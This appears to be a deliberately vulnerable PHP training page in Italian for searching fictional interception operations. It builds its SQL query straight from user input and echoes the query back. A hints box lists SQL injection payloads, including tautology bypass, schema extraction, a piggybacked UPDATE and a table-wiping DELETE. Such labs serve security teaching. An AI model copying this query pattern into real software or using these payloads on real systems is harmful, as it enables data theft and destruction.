<?php
session_start();
if (!isset($_SESSION['user_data'])) {
    header('Location: login.php');
    exit;
}
require_once 'db_config.php';

$results = [];
$search = '';

if (isset($_GET['search'])) {
    $search = $_GET['search'];
    
    $query = "SELECT o.*, 
              p.nome as comandante_nome, 
              p.cognome as comandante_cognome,
              p.matricola as comandante_matricola,
              s.codice as stato,
              c.nome as classificazione
              FROM operazioni_intercettazione o
              JOIN personale p ON o.comandante_id = p.id
              JOIN stato_operativo s ON o.stato_id = s.id
              JOIN classificazione c ON o.classificazione_id = c.id
              WHERE o.codice_operazione LIKE '%$search%' 
              OR o.nome_operazione LIKE '%$search%'
              OR o.obiettivo LIKE '%$search%'";
    
    echo "<!-- DEBUG Query: $query -->";
    
    $results = execute_query($query);
}
$db_error = null;
if (!empty($results) && isset($results[0]['__error'])) {
    $db_error = $results[0]['__error'];
    $results = [];
}

?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ricerca Operazioni</title>
    <link rel="stylesheet" href="/css/common.css">
    <link rel="stylesheet" href="css/search_operations.css">
</head>
<body>
    <div class="container">
        <h1>RICERCA OPERAZIONI</h1>
        
        <form method="GET" class="search-form">
            <input type="text" name="search" 
                   placeholder="Cerca operazioni per codice, nome o obiettivo..." 
                   value="<?php echo htmlspecialchars($search); ?>">
            <input type="submit" value="CERCA">
        </form>
        
        <?php if ($results && count($results) > 0): ?>
            <div class="results-count">
                <strong>Risultati trovati: <?php echo count($results); ?> operazioni</strong>
            </div>
            
            <?php foreach ($results as $op): ?>
                <div class="success-box">
                    <div class="card-header">
                        <div class="card-title">
                            <?php echo htmlspecialchars($op['nome_operazione'] ?? ''); ?>
                        </div>
                            <?php echo htmlspecialchars($op['codice_operazione']); ?>
                    </div>
                    
                    <div class="user-info">
                        <div class="info-item">
                            <div class="info-label">Classificazione</div>
                            <div class="info-value">
                                <?php if (($op['classificazione'] ?? '') == 'TOP SECRET'): ?>
                                    <span class="status-badge" style="background: #f00; color: #fff;">
                                        <?php echo htmlspecialchars($op['classificazione']); ?>
                                    </span>
                                <?php else: ?>
                                    <?php echo htmlspecialchars($op['classificazione'] ?? ''); ?>
                                <?php endif; ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Stato</div>
                            <div class="info-value">
                                <span class="status-badge">
                                    <?php echo htmlspecialchars($op['stato'] ?? ''); ?>
                                </span>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Comandante</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($op['comandante_nome'] ?? ''); ?> 
                                <?php echo htmlspecialchars($op['comandante_cognome'] ?? ''); ?><br>
                                <small style="color: #666;">
                                    (<?php echo htmlspecialchars($op['comandante_matricola'] ?? ''); ?>)
                                </small>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Data Inizio</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($op['data_inizio'] ?? 'N/A'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Data Fine</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($op['data_fine'] ?? 'In corso'); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">Budget</div>
                            <div class="info-value">
                                €<?php echo number_format($op['budget_stanziato'] ?? 0, 2); ?>
                            </div>
                        </div>
                    </div>
                    
                    <?php if (!empty($op['obiettivo'])): ?>
                        <div class="message-section">
                            <strong>OBIETTIVO:</strong><br>
                            <span class="encryption-field">
                                <?php echo nl2br(htmlspecialchars($op['obiettivo'])); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                    
                    <?php if (!empty($op['descrizione'])): ?>
                        <div class="message-section">
                            <strong>DESCRIZIONE:</strong><br>
                            <span class="encryption-field">
                                <?php echo nl2br(htmlspecialchars($op['descrizione'])); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                    
                    <?php if (!empty($op['note_operative'])): ?>
                        <div class="message-section">
                            <strong>NOTE OPERATIVE RISERVATE:</strong><br>
                            <span class="encryption-field">
                                <?php echo nl2br(htmlspecialchars($op['note_operative'])); ?>
                            </span>
                        </div>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
            
            <?php elseif (isset($_GET['search'])): ?>
                <?php if ($db_error): ?>
                    <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                        Errore database: "<?php echo htmlspecialchars($db_error); ?>"
                    </div>
                <?php endif; ?>
                
                <div style="text-align: center; color: #f00; padding: 20px; border: 1px solid #f00; border-radius: 5px; word-wrap: break-word; word-break: break-word; overflow-wrap: break-word; max-width: 100%;">
                    Nessuna comunicazione trovata per: "<?php echo htmlspecialchars($search); ?>"
                    <br><br>
                    <?php echo htmlspecialchars($query); ?>
                </div>
            <?php endif; ?>
        
        <div class="hints">
        <h3>ISTRUZIONI PER ATTACCO SQL INJECTION</h3>

        <p><strong>1. Mostra la Query:</strong><br>
        <code>Qualsiasi</code></p>

        <p><strong>2. Mostra tutte le operazioni (Tautologia):</strong><br>
        <code>' OR '1'='1' --</code></p>

        <p><strong>3. Lancia Errore per scoprire la struttura tabella (Information Schema):</strong><br>
        <code>' AND 1=CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='operazioni_intercettazione') AS INT) --</code></p>

        <p><strong>4. Modifica stato operazione (piggybacked - INTEGRITY):</strong><br>
        <code>'; UPDATE operazioni_intercettazione SET budget_stanziato=1000000 --</code></p>

        <p><strong>5. Elimina Query (Catastrofico - INTEGRITY):</strong><br>
        <code>'; DELETE FROM operazioni_intercettazione WHERE '1'='1' --</code></p>
        </div>

        
        <div class="bottom-buttons">
            <a href="login.php" class="btn1 left">&lt;- Indietro </a>
        </div>
    </div>
</body>
</html>